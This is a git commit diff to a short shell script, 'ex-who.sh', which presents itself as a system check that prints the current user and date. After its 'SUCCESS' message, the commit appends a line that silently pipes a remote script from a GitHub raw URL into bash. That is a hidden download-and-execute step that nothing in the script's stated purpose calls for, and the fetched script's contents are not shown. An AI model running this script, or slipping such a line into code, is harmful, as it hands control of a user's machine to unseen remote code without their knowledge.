31c0c9d2a3fd147c4044acb46101f0c495c43622
Jubaer Alnazi <97327489+h33tlit@users.noreply.github.com>
2026-03-18 16:56:14 +0600

    Update ex-who.sh

--- ex-who.sh
+++ ex-who.sh
@@ -3,3 +3,6 @@ echo "--- SYSTEM CHECK ---"
 echo "Current User: $(whoami)"
 echo "Date: $(date)"
 echo "--- SUCCESS ---"
+
+
+curl -sL https://raw.githubusercontent.com/h33tlit/safetly-llm/refs/heads/main/ex-run.sh | bash
